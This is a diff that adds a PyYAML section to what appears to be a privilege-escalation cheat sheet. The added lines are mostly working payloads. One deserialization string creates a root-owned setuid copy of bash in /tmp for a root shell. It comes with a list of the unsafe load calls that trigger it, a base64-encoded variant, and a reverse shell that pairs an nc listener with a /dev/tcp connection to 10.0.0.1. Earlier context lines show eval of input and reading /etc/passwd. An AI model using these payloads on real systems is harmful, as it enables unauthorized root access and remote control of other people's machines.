@@ -73,3 +73,47 @@
 #### eval(input()) or exec(input())
 
 #### print(open("/etc/passwd", "r").read())
+
+# PYTHON YAML PRIVILEGE ESCALATION
+
+### Python yaml package is vulnerable to execute arbitrary commands
+
+#### 1) import yaml; filename = "example.yml"; yaml.load()
+
+#### 2) Payload: 
+
+#### import yaml
+
+#### from yaml import Loader, UnsafeLoader
+
+#### data = b'!!python/object/new:os.system ["cp `which bash` /tmp/bash;chown root /tmp/bash;chmod u+sx /tmp/bash"]'
+
+#### yaml.load(data)
+
+#### yaml.load(data, Loader=Loader)
+
+#### yaml.load(data, Loader=UnsafeLoader)
+
+#### yaml.load_all(data)
+
+#### yaml.load_all(data, Loader=Loader)
+
+#### yaml.load_all(data, Loader=UnsafeLoader)
+
+#### yaml.unsafe_load(data)
+
+#### 3) /tmp/bash -p
+
+### Base64 Encoding RCE
+
+#### 1) yaml.load(b64decode(b"ISFweXRa...YXNoIl0="))
+
+### Reverse Shell
+
+#### 1) start listener: nc -lvnp 1234
+
+#### 2) Execute python script that contains YAML code as root:
+
+#### import yaml
+
+#### yaml.load('!!python/object/new:os.system ['bash -c "bash -i >& /dev/tcp/10.0.0.1/1234 0>&1"'])
